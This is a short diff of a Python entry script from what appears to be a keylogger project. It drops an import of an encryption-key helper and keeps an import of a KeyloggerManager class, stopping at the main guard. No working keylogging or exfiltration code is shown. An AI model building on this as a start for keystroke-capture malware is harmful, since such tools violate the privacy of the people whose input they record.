@@ -1,6 +1,4 @@
 import time
-
-from create_encryption_key import CreateKey
 from keylogger_manager import KeyloggerManager
 
 if __name__ == "__main__":
